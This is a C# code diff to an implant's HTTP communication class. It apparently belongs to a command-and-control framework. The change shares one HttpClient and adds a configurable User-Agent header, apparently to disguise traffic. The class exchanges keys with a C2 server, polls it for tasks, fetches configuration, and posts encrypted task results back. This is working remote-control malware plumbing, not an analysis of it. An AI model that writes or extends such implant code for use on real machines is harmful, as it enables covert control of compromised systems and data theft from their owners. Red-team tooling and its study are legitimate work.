@@ -15,17 +15,19 @@ namespace Implant
         private string name;
 
         private CryptoProvider cryptoProvider;
-        public HTTPCommunicationProvider(string c2Url, string name)
+
+        private HttpClient client;
+        public HTTPCommunicationProvider(string c2Url, string name, string userAgent)
         {
             this.c2Url = c2Url;
             this.name = name;
             this.cryptoProvider = new CryptoProvider();
+            this.client = new HttpClient();
+            this.client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);
         }
 
         public void keyExchangeSetup()
         {
-           
-            var client = new HttpClient();
             //string body = "{\"name\":\"__name__\",\"publicKey\": \"__keyContent__\"}".Replace("__keyContent__", Base64Encode(cryptoProvider.getPublicKey())).Replace("__name__",this.name);
             string body = buildJsonMessage(Base64Encode(cryptoProvider.getPublicKey()));
 
@@ -37,8 +39,6 @@ namespace Implant
 
         public string sendEncryptedRequest(string body, string endpoint)
         {
-
-            var client = new HttpClient();
             string encryptedBody = cryptoProvider.encryptAesMessage(body);
             string jsonBody = buildJsonMessage(encryptedBody);
             var response = client.PostAsync(this.c2Url + endpoint, new StringContent(jsonBody, Encoding.UTF8, "application/json")).Result;
@@ -51,7 +51,6 @@ namespace Implant
 
 
         public Config getConfig() {
-            var client = new HttpClient();
             var response = client.GetAsync(this.c2Url + "/getConfig/" + this.name).Result;
 
             var encryptedString = response.Content.ReadAsStringAsync().Result;
@@ -61,7 +60,6 @@ namespace Implant
         }
 
         public Task getNextTask() {
-            var client = new HttpClient();
             var response = client.GetAsync(this.c2Url + "/getNextTask/" +this.name).Result;
 
             var encryptedString = response.Content.ReadAsStringAsync().Result;
@@ -72,7 +70,6 @@ namespace Implant
         }
 
         public void updateTaskResult(string UUID, string taskResult){
-            var client = new HttpClient();
             var body = new Dictionary<string, string>();
             body.Add("taskId", UUID);
             body.Add("taskResult", taskResult);
